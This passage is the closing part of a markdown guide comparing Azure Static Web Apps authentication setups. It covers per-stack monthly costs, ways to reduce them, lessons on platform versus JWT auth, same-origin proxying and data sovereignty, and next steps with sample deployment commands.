- Function Consumption: Free tier covers 1M requests/month (typical usage: <10k/month)
- Function Premium EP1: ~$100/month ($0.138/hour)
- Private Endpoint: ~$10/month ($0.01/hour)
- Private DNS Zone: ~$0.50/month
- Custom domains: Free SSL certificates (included in Standard)

### Total Demonstration Cost

**If running all stacks simultaneously:**

- Stacks 03, 04, 05a, 05b, 05c, 06, 08, 09: 8 × $9 = $72/month
- Stack 07: $129/month
- **Total: ~$201/month**

**Recommended approach:**

- Keep 2-3 stacks running (Stack 03, 05b, 08): ~$27/month
- Deploy others as needed for demonstrations
- Delete Stack 07 when not actively demonstrating (most expensive)

### Cost Optimization Strategies

#### Strategy 1: Free Tier SWA

- Use Free tier for non-production stacks
- Saves $8/stack
- Limitations:
- No custom domains
- No custom auth (Entra ID)
- Smaller limits
- Use for: Stacks 03, 04, 08 (no custom auth needed)
- Savings: 3 × $8 = $24/month

#### Strategy 2: Shared Function Apps

- Use same function app for multiple stacks
- Only works for BYO stacks
- Example:
- Stacks 03, 05a, 05b all use same function app
- Deploy once, link to multiple SWAs
- Savings: Minimal (functions are free tier anyway)
- Benefit: Less management overhead

#### Strategy 3: Deploy on Demand

- Keep only baseline (Stack 03) running 24/7: $9/month
- Deploy others for demonstrations: ~$1/day each
- Delete after demonstration
- Total: $9 baseline + demo costs
- Example: 2 demos/month = $9 + (2 × $9) = $27/month

#### Strategy 4: Use Managed Functions Where Possible

- Stacks 04, 09 have no separate function app management
- Slightly simpler, same cost
- Consider for EU-based demonstrations

**Recommendation:**

- Run Stack 03 (baseline) and Stack 05b (recommended) 24/7: $18/month
- Deploy others as needed
- Total: ~$20-30/month typical

---

## Key Learnings

### 1. Managed vs BYO Functions

**Key Insight:** Cost is the same ($9/month), difference is control vs simplicity

**Managed Functions:**

- Simpler deployment (GitHub Actions)
- Less to manage (SWA handles it)
- Region locked (5 regions)
- But: Same cost as BYO

**BYO Functions:**

- Full control (region, plan, networking)
- More deployment steps
- Separate resource to manage
- But: Same cost as managed

**Recommendation:** Use BYO for flexibility, managed for simplicity (if region works)

### 2. Platform Auth vs Application Auth

**Key Insight:** Platform auth (Entra ID) is more secure than application auth (JWT)

**Why Platform Auth is Better:**

- HttpOnly cookies (JavaScript can't access)
- Automatic CSRF protection (SameSite cookies)
- No token management code
- Enterprise SSO integration
- Microsoft manages security updates

**When Application Auth Makes Sense:**

- Multi-platform (mobile, desktop, web)
- Custom user management required
- Legacy system integration

**Recommendation:** Use platform auth (Entra ID) unless you have specific reason not to

### 3. Same-Origin vs Cross-Origin

**Key Insight:** Same-origin (SWA `/api` route) is better than cross-origin (direct function URL)

**Same-Origin Benefits:**

- No CORS issues
- Cookies sent automatically
- Harder to identify backend
- Cleaner in dev tools

**Cross-Origin Downsides:**

- CORS preflight required
- Function URL visible
- More exposure

**Recommendation:** Use SWA linked backend (Stack 05b) for same-origin benefits

### 4. Defense-in-Depth

**Key Insight:** Layer multiple security controls for best protection

**Single Layer (Stack 05a):**

- Only frontend protected
- API can be bypassed
- Weakest

**Two Layers (Stack 05b):**

- Frontend + SWA proxy
- API accessible directly
- Better

**Three Layers (Stack 06):**

- Frontend + SWA proxy + IP restrictions
- Difficult to bypass
- Good balance

**Four Layers (Stack 07):**

- Frontend + SWA proxy + network + VNet
- No bypass possible
- Maximum security

**Recommendation:** Stack 05b for most apps, Stack 06 for important apps, Stack 07 for compliance

### 5. Data Sovereignty is Non-Negotiable

**Key Insight:** If you have specific region requirements, you MUST use BYO functions

**Example:**

- UK healthcare: MUST use uksouth (Stack 07)
- Can't use managed functions (westeurope)
- No alternative

**Recommendation:**

- Check compliance requirements first
- Don't assume "EU is fine" - might need specific country
- BYO gives you flexibility

### 6. Cost vs Security Trade-offs

**Key Insight:** Big security jump from $9 to $129/month (Stack 06 → Stack 07)

**Stack 06 ($9/month):**

- IP restrictions
- Header validation
- Difficult to bypass
- Good for most scenarios

**Stack 07 ($129/month):**

- VNet isolation
- Private endpoints
- Impossible to bypass
- 14× more expensive

**Gap:**

- No option between $9 and $129
- Premium plan required for VNet ($100/month)

**Recommendation:**

- Most organizations: Stack 06 is sufficient
- Compliance-required: Stack 07 is necessary
- No middle ground unfortunately

### 7. Complexity vs Security

**Key Insight:** Stack 05b is sweet spot - good security, reasonable complexity

**Simplest (Stack 03):**

- No auth
- Public everything
- Easy to understand
- But: No security

**Sweet Spot (Stack 05b):**

- Entra ID (enterprise SSO)
- SWA proxy (same-origin)
- Reasonable setup
- Good security
- **Recommended for most**

**Most Secure (Stack 07):**

- VNet, private endpoints
- Complex networking
- Expensive
- Maximum security
- Only when required

**Recommendation:** Start with Stack 05b, add layers only if needed

### 8. Documentation Matters

**Key Insight:** Microsoft docs assume too much knowledge

**What's Missing:**

- Clear managed vs BYO comparison
- Data sovereignty implications
- Real-world examples
- Cost comparisons
- Security trade-offs

**This Guide Provides:**

- Side-by-side comparisons
- Real costs
- Decision trees
- Working examples
- Troubleshooting

**Recommendation:** Build your own docs (like this) for team reference

---

## Next Steps

### 1. Deploy First Stack

**Start with Stack 04 or 05b:**

#### Option A: Stack 04 (Managed, Simple)

```bash
# If EU data sovereignty is acceptable
cd ~/Developer/personal/azure-tui/infrastructure/azure
./stack-04-swa-typescript-managed.sh
```

#### Option B: Stack 05b (BYO, Recommended)

```bash
# If you need specific region (uksouth)
cd ~/Developer/personal/azure-tui/infrastructure/azure
export AZURE_CLIENT_ID="your-app-id"
export AZURE_CLIENT_SECRET="your-secret"
export LOCATION=uksouth
./stack-05b-swa-typescript-entraid-linked.sh
```

### 2. Test and Verify

- Open browser, test login
- Check dev tools (Network tab)
- Try bypass (curl)
- Verify region compliance

### 3. Deploy Additional Stacks

**For comparison demonstrations:**

- Stack 03 (baseline)
- Stack 08 (JWT for comparison)
- Stack 06 (if need defense-in-depth)

### 4. Document Your Setup

- Screenshot browser dev tools for each stack
- Document what's secured vs not secured
- Create comparison presentation for colleagues

### 5. Create Presentation

**Key Topics:**

- Why platform auth > application auth
- Same-origin vs cross-origin
- Data sovereignty requirements
- Cost vs security trade-offs
- When to use each stack

### 6. Clean Up

**After demonstrations:**

- Keep Stack 05b running (production-ready)
- Delete expensive stacks (Stack 07)
- Delete duplicates
- Typical cost: $9-18/month

---

## Conclusion

This guide provides comprehensive reference for all Azure Static Web Apps authentication patterns. Use it to:

1. **Understand options:** Managed vs BYO, platform vs application auth
1. **Choose correctly:** Based on requirements (sovereignty, security, cost)
1. **Deploy confidently:** Working scripts and configurations
1. **Troubleshoot effectively:** Common issues and solutions
1. **Educate colleagues:** Complete comparison and demonstrations

**Most Important Takeaways:**

1. **BYO Functions** for data sovereignty, **Managed Functions** for simplicity
1. **Stack 05b** is recommended for most enterprise applications
1. **Platform auth** (Entra ID) is more secure than application auth (JWT)
1. **Defense-in-depth** (multiple layers) is better than single layer
1. **Same-origin** (SWA proxy) is better than cross-origin (direct calls)

**Questions or Issues?**

Review the [Troubleshooting](#troubleshooting) section or consult:

- Azure Static Web Apps docs: <https://learn.microsoft.com/en-us/azure/static-web-apps/>
- Azure Functions docs: <https://learn.microsoft.com/en-us/azure/azure-functions/>
- This repository's issues: <https://github.com/your-repo/issues>
